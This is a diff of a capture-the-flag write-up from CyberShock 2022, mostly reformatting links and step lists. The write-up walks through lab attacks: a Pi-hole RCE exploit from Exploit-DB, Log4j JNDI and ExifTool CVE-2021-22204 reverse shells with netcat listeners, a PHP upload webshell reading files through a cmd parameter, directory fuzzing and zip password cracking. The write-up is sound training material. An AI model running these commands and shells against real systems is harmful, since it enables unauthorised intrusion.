@@ -101,7 +101,7 @@ To be exact, pinging the IP addresses works, but names do not resolve.
 QUESTION
 Investigate your DNS server Pi-hole
 and find a way to read the log file at /var/log/dnserror.log
-Pi-Hole: http://env263.target03/admin
+Pi-Hole: <http://env263.target03/admin>
 ```
 
 The first thing that I tried when visiting the login page
@@ -110,7 +110,7 @@ was the password "admin" and the guess was correct.
 On the landing page, I checked what version of Pi-hole
 was installed.
 
-![Pi-Hole landing page with version highlighted](../../images/pi-hole-version.png){: .image-process-crisp}
+![Pi-Hole landing page with version highlighted](images/pi-hole-version.png){: .image-process-crisp}
 
 The next obvious thing was to check if any vulnerability is present on that version in Exploit DB,
 where this was found: <https://www.exploit-db.com/exploits/48519>
@@ -125,7 +125,7 @@ root@env263.kali05:/home/gt/its-always-dns# python3 48519.py
 [?] Please enter the IP address for Pi-Hole ([env263.target03]): 
 [?] Please enter the your (reachable) IP address to launch listeners ([10.85.26.3]): 
 [?] Please enter the password for Pi-Hole ([admin]): 
-[+] Vulnerable URL is http://env263.target03/admin
+[+] Vulnerable URL is <http://env263.target03/admin>
 [+] Creation success, ID is 6!
 [!] Binding to 10.85.26.3:80
 [+] Yes, we have an incoming connection from 10.93.26.3
@@ -139,7 +139,7 @@ Ok, make sure to have a netcat listener on "10.85.26.3:9001" ("nc -lnvp 9001") a
 [+] Yes, we have an incoming connection from 10.93.26.3
 [!] Closing Listener
 [+] Update succeeded.
-[+] Calling http://env263.target03/admin/scripts/pi-hole/php/aotagnto.php
+[+] Calling <http://env263.target03/admin/scripts/pi-hole/php/aotagnto.php>
 [+] Calling exploit succeeded.
     
 [+] Cleaning up now.
@@ -152,23 +152,23 @@ Ok, cool. Where's the shell? Turns out it was a dud.
 Multiple attempts were made, but non-succeeded, but
 luckly after trying a custom payload to test the exploit, it was a success!
 
-![Modified part of the RCE code](../../images/auth-rce-new-payload.png){: .image-process-crisp}
+![Modified part of the RCE code](images/auth-rce-new-payload.png){: .image-process-crisp}
 
 Exploit confirmed.
 
-![RCE exploit confirmed](../../images/auth-rce-exploit-confirmed.png){: .image-process-crisp}
+![RCE exploit confirmed](images/auth-rce-exploit-confirmed.png){: .image-process-crisp}
 
 So where did I check it? It was here:
 
-![Exploit location found](../../images/exploit-here.png){: .image-process-crisp}
+![Exploit location found](images/exploit-here.png){: .image-process-crisp}
 
 Replacing the payload with a simple webshell
 
-![New webshell payload](../../images/auth-rce-webshell-payload.png){: .image-process-crisp}
+![New webshell payload](images/auth-rce-webshell-payload.png){: .image-process-crisp}
 
 Exploit code output:
 
-![New payload output](../../images/auth-rce-exploit-code-output.png){: .image-process-crisp}
+![New payload output](images/auth-rce-exploit-code-output.png){: .image-process-crisp}
 
 And the flag was found by following this link: <http://env263.target03/admin/scripts/pi-hole/php/fun.php?cmd=cat%20/var/log/dnserror.log>
 
@@ -179,7 +179,7 @@ And the flag was found by following this link: <http://env263.target03/admin/scr
 ```md
 DESCRIPTION
 A friend asks for help with recent movie that was downloaded from torrents: something is wrong with player.
-The video is available at https://static.ctftech.io/challs/Horror_stories_2k21-720p.zip
+The video is available at <https://static.ctftech.io/challs/Horror_stories_2k21-720p.zip>
 QUESTION
 What is the address of C&C of the malware?
 The answer is expected in usual format for an Internet address - <IP>:<PORT>
@@ -337,7 +337,7 @@ You only remember the following details:
 Tool: openssl
 Password: Kh39.3e12kleZs-po7
 Encrypted file
-https://static.ctftech.io/challs/pin.enc?_gl=1*1i0w9rs*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDg5MjE3NC42LjEuMTY2NDg5MjI3OC4wLjAuMA
+<https://static.ctftech.io/challs/pin.enc?_gl=1*1i0w9rs*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDg5MjE3NC42LjEuMTY2NDg5MjI3OC4wLjAuMA>
 ```
 
 **Solution:** Brute-force the decryption with algorithms listed for `openssl enc`. :)
@@ -411,7 +411,7 @@ This was executed:
 
 ```bash
 # After downloading the binary
-https://github.com/MCCTeam/Minecraft-Console-Client/releases/tag/20221004-85
+<https://github.com/MCCTeam/Minecraft-Console-Client/releases/tag/20221004-85>
 
 apt install dotnet-runtime-6
 
@@ -492,7 +492,7 @@ After everything was setup, the following script was ran in the MC client to sen
 
 You will notice that the LDAP server is spammed, not sure what caused this, but had to kill the redirector just to not DoS the minecraft server.
 
-![Send jndi message and LDAP server](images/ldap-redirect-server.png){: .image-process-crisp}
+![Send jndi message and LDAP server](/images/ldap-redirect-server.png){: .image-process-crisp}
 
 ![HTTP servers and reverse shell listener](images/http-servers-running-with-listener.png){: .image-process-crisp}
 
@@ -622,7 +622,7 @@ You find a strange note from your backpack.
 PS! There is also a post-it-note on the backside of the paper where are written the following numbers 32 54 80 46 155.
 QUESTION
 Figure out what the note means and find the flag.
-strange note: https://static.ctftech.io/challs/encoded_story.html?_gl=1*1oieq6w*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDk0OTc0MC4xMS4xLjE2NjQ5NDk3NDEuMC4wLjA.
+strange note: <https://static.ctftech.io/challs/encoded_story.html?_gl=1*1oieq6w*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDk0OTc0MC4xMS4xLjE2NjQ5NDk3NDEuMC4wLjA.>
 ```
 
 ### SMART CITY
@@ -718,7 +718,7 @@ Quick google search reveals to us that ExifTool is a free and open-source softwa
 
 ##### Steps
 
-1. Google search the exploit: `https://github.com/UNICORDev/exploit-CVE-2021-22204`, download it by using `git` commands.
+1. Google search the exploit: <https://github.com/UNICORDev/exploit-CVE-2021-22204>, download it by using `git` commands.
 2. Launch a `netcat` utility reverse shell listener on `9001` port: `nc -lvnp 9001`
 3. Launch a CVE exploit and specify IP address through `-s` flag: `python3 exploit-CVE-2021-22204.py -s 10.X.Y.Z 9001` (here the real IPv4 address is hidden on purpose).
 4. Upload any file to the ExifTool service.
@@ -738,12 +738,12 @@ The only thing we know is the exposed IP address.
 
 ##### Solution
 
-By scanning `http://envXYZ.target03:8000/` with gobuster, `robots.txt` was found which led to `/js/config.js`
+By scanning <http://envXYZ.target03:8000/> with gobuster, `robots.txt` was found which led to `/js/config.js`
 containing the API key to the API which was vulnerable to LFI using the `file` parameter.
 
 ##### Steps
 
-Access `http://envXYZ.target03:8000/` and scan directories using [gobuster](https://github.com/OJ/gobuster)
+Access <http://envXYZ.target03:8000/> and scan directories using [gobuster](https://github.com/OJ/gobuster)
 with the `common.txt` wordlist from [SecLists](https://github.com/danielmiessler/SecLists)
 
 ```bash
@@ -829,7 +829,7 @@ Find out if there is some vulnerability, backdoor, misconfiguration, etc. that w
 Digital Signage Management Interface
 Flag will be given when correct login credentials are used.
 
-http://env263.target03:8888/
+<http://env263.target03:8888/>
 ```
 
 ##### Solution
@@ -850,7 +850,7 @@ You decide to take matters into your own hands.
 QUESTION
 Find a vulnerability in the city guide application and for POC, read the flag from /var/flag.txt
 
-http://env263.target03:8111/
+<http://env263.target03:8111/>
 ```
 
 ##### Solution
@@ -863,8 +863,8 @@ Solution here was to upload PHP file, get RCE and read /var/flag.txt content
 2. In /smartupload we where able to upload files but where do the go?
 3. After fuzzing with `gobuster dir -u http://env263.target03:8111/smartupload/ -w /usr/share/seclists/Discovery/Web-Content/common.txt` we noticed the `/smartupload/uploads` folder.
 4. After opening BURP and modifying the POST request contents we can see `?msg=success` redirect location that indicates that our file was uploaded successfully.
-   ![Burp payload for php shell](../../images/cybershock-2022-maps.png){: .image-process-crisp}
-5. As we already know that files go into `/smartupload/uploads` path we go into our url `http://env263.target03:8111/smartupload/uploads/filename2.png?c=cat%20/var/flag.txt` and receive flag `?PNG  Flag: 3760cbd5-d23b-4517-8aee-26f43cb178d4`.
+   ![Burp payload for php shell](images/cybershock-2022-maps.png){: .image-process-crisp}
+5. As we already know that files go into `/smartupload/uploads` path we go into our url <http://env263.target03:8111/smartupload/uploads/filename2.png?c=cat%20/var/flag.txt> and receive flag `?PNG  Flag: 3760cbd5-d23b-4517-8aee-26f43cb178d4`.
 
 #### REGISTRY (UNSOLVED by us)
 
@@ -887,7 +887,7 @@ SOC has managed to acquire two encrypted messages and a plain text message, that
 QUESTION
 Identify the encryption key and recover the other plaintext.
 Get the files from HERE
-https://static.ctftech.io/challs/captured_files.zip?_gl=1*1t9e0jc*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDk0OTc0MC4xMS4xLjE2NjQ5NDk3NDEuMC4wLjA.
+<https://static.ctftech.io/challs/captured_files.zip?_gl=1*1t9e0jc*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDk0OTc0MC4xMS4xLjE2NjQ5NDk3NDEuMC4wLjA.>
 ```
 
 #### SMART AIRSPACE
@@ -913,19 +913,19 @@ Using the CTF discord invite link a CTF Tech Bot was visible as one of the first
 
 ##### Steps
 
-1. After sliding into the bot's DM's a *!minictf* was sent that resulted in the following reply:
+After sliding into the bot's DM's a *!minictf* was sent that resulted in the following reply:
 
 ![Command output](images/automated-minictf.png){: .image-process-crisp}
 
 Correct answer is 00100000 (converting 32 from decimal to binary).
 
-2. After that the following question was provided:
+After that the following question was provided:
 
 ![Linux answer](images/automated-linux.png){: .image-process-crisp}
 
 It is widely known that Linux is beneficial due to excellent performance rates and stability.
 
-3. After that a flag was provided to the team with ease:
+After that a flag was provided to the team with ease:
 
 ![Automated flag](images/automated-flag.png){: .image-process-crisp}
 
@@ -958,8 +958,8 @@ Solution here was to understand structure of bar code given in boarding pass and
 
 ##### Steps
 
-1. We used an online tool https://online-barcode-reader.inliteresearch.com/ to extract current barcode text which was: `M1RAMBO/JOHN        EHKGZFR TLLRIXEE 4253 269Y004D0021`
-2. After searching on internet how the structure of boarding pass tickets are built we managed to understand existing structure: https://javadude.wordpress.com/2017/10/07/whats-in-my-boarding-pass-barcode/
+1. We used an online tool <https://online-barcode-reader.inliteresearch.com/> to extract current barcode text which was: `M1RAMBO/JOHN        EHKGZFR TLLRIXEE 4253 269Y004D0021`
+2. After searching on internet how the structure of boarding pass tickets are built we managed to understand existing structure: <https://javadude.wordpress.com/2017/10/07/whats-in-my-boarding-pass-barcode/>
 3. We did our modification on barcode text that ended up with: `M1RAMBO/JOHN ECTF123 TAYSYDEE 0777 269Y004D0021`
 
 In our modification: E stands for electronic ticket, CTF123 stands for ticket number, TAY stands for Tartu airport number, SYD stands for Sydnay airport number, EE stands for Nordic airline, 0777 stands for our flight number
@@ -999,7 +999,7 @@ When inspecting the logs, a correlation between the start of the compromise and 
 QUESTION
 Inspect the flight plan, find out if there is anything malicious hidden in it.
 Flag format: uuid v4
-<https://static.ctftech.io/challs/flight-plan.pdf?_gl=1>*18nguau*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDkxMjAyOC43LjEuMTY2NDkxMjAyOS4wLjAuMA..
+<https://static.ctftech.io/challs/flight-plan.pdf?_gl=1*18nguau*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDkxMjAyOC43LjEuMTY2NDkxMjAyOS4wLjAuMA..>
 ```
 
 ##### Solution
@@ -1009,23 +1009,23 @@ the given one, which needed to be extracted using a utility tool, the attachemnt
 
 ##### Steps
 
-1. Install qpdf package with `sudo apt-get install qpdf`.
+Install qpdf package with `sudo apt-get install qpdf`.
 
-2. List attachments of the PDF file: `qpdf --list-attachments flight-plan.pdf`  
+List attachments of the PDF file: `qpdf --list-attachments flight-plan.pdf`  
 
 ![PDF contents](images/flight-plan-contents.png){: .image-process-crisp}
 
-3. Export the found attachment.
+Export the found attachment.
 
 ```bash
 qpdf --show-attachment="ATS flight plan-ori" flight-plan.pdf > attachment.pdf
 ```
 
-4. Open `attachment.pdf` using `wine` with command: `wine ATS\ flight\ plan-ori.pdf`
+Open `attachment.pdf` using `wine` with command: `wine ATS\ flight\ plan-ori.pdf`
 
 - The attachment was not a PDF file, but a Windows executable.
 
-5. The flag is displayed after opening the attachment using `wine`.
+The flag is displayed after opening the attachment using `wine`.
 
 ![PDF flag](../../images/flight-plan-flag.png){: .image-process-crisp}
 
@@ -1056,7 +1056,7 @@ Solution here was to merge two files into one and get the md5sum of the file.
 
 ##### Steps
 
-1. Simply run the following bash one-liner:
+Simply run the following bash one-liner:
 
 ```bash
 paste -d '\n' split1.csv split2.csv | grep . | md5sum
@@ -1095,15 +1095,15 @@ Links used when going through the challenge:
 
 ##### Steps
 
-1. Connect using SSH: `sshpass -p Cool2Pass ssh -p 2222 user@env263.target02`.
+Connect using SSH: `sshpass -p Cool2Pass ssh -p 2222 user@env263.target02`.
 
 - `sshpass` needs to be installed separately.
 
-2. Examine the contents of `/var/www/html`. The `evidence` folder needs to be protected.
+Examine the contents of `/var/www/html`. The `evidence` folder needs to be protected.
 
 ![HTML folder](images/top-secret-html.png){: .image-process-crisp}
 
-3. Change current directory to `/var/www/html/evidence` and execute the following:
+Change current directory to `/var/www/html/evidence` and execute the following:
 
 ```bash
 # Generated a password file
@@ -1113,7 +1113,7 @@ mulder:$apr1$xVxxLLon$ASAgafxUZWNMiaSJzbK1n.
 
 - This generates a credential file for the specific folder.
 
-4. Open apache configuration and specify that the directory is protected:
+Open apache configuration and specify that the directory is protected:
 
 ```bash
 # Did the following, because it didn't immediatelly work
@@ -1129,7 +1129,7 @@ sudo vim /etc/apache2/apache2.conf
 </Directory>
 ```
 
-5. Finally restarted the apache service using `sudo service apache2 restart` and after pressing submit in the challenge platform, was able to pass the challenge.
+Finally restarted the apache service using `sudo service apache2 restart` and after pressing submit in the challenge platform, was able to pass the challenge.
 
 Here's the expected login prompt:
 
@@ -1156,19 +1156,19 @@ Due to the attacker not deleting the persistance script in the same layer, it wa
 
 ##### Steps
 
-1. Go to Docker Hub and check all of the image layers. The layer that we are interested in is layer 9, in which a quite interesting `persistence.sh` bash script is being executed.
+Go to Docker Hub and check all of the image layers. The layer that we are interested in is layer 9, in which a quite interesting `persistence.sh` bash script is being executed.
 
 ![Docker image layers](images/backdoor-image-layers.png){: .image-process-crisp}
 
-2. Extract the docker image into a `.tar` file.
+Extract the docker image into a `.tar` file.
 
 ```bash
 docker save docker.io/cybexer/ctf-jumphost:icsc > icsc-image.tar
 ```
 
-3. Unarchive the file with `tar -xf icsc-image.tar`.
+Unarchive the file with `tar -xf icsc-image.tar`.
 
-4. Unarchive all of the image layers by using linux `find` command.
+Unarchive all of the image layers by using linux `find` command.
 
 ```bash
 find -name layer.tar -exec tar -xf {} \;
@@ -1176,7 +1176,7 @@ find -name layer.tar -exec tar -xf {} \;
 
 ![Layer.tar structure](images/backdoor-layer-tar.png){: .image-process-crisp}
 
-5. A `persistence.sh` script can be seen in the screenshots above and to get the flag simply open it.
+A `persistence.sh` script can be seen in the screenshots above and to get the flag simply open it.
 
 #### LEAKED DATA (UNSOLVED by us)
 
@@ -1188,7 +1188,7 @@ It is known that the message is encrypted with one of those keys.
 QUESTION
 Find out what data was extracted from the network by decrypting it.
 Recovered files
-<https://static.ctftech.io/challs/output.zip?_gl=1>*1oed30*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDg4NzYwMC41LjAuMTY2NDg4NzYwMC4wLjAuMA..
+<https://static.ctftech.io/challs/output.zip?_gl=1*1oed30*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDg4NzYwMC41LjAuMTY2NDg4NzYwMC4wLjAuMA..>
 ```
 
 #### ATC
@@ -1204,34 +1204,6 @@ QUESTION
 Investigate if you can still recover some unencrypted files from the system.
 ATC Radar
 ```
-
-##### Solution
-
-The solutions was to directory brute-force the server after guessing/brute-forcing the admin user account in order to find the credentials stored in a password protected backup file which was cracked using `zip2john`.
-
-- The fuzzer used was [`ffuf`](https://github.com/ffuf/ffuf) (metasploit could also be used for this).
-
-##### Steps
-
-0. Brute-force or guess the credentials.
-
-1. Use the credentials to create a Basic Auth base64 string `echo -n "admin:password" | base64`.
-
-2. Perform an authenticated directory brute-force attack with the credentials.
-
-```bash
-ffuf -w /usr/share/wordlists/dirbuster/directories.jbrofuzz -u http://env263.target03:8080/FUZZ -mc 200 -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ="
-```
-
-![ATC directories](images/atc-ffuf.png){: .image-process-crisp}
-
-3. By looking at the results and accessing `/directory` we can see a password-protected .zip file inside. Download it using `wget` and bruteforce by using `zip2john`.
-
-- Cracked password is: `987654321`.
-
-![Encrypted ZIP](images/atc-zip.png){: .image-process-crisp}
-
-4. Enter password in the archive and retrieve the flag.
 
 ##### Solution
 
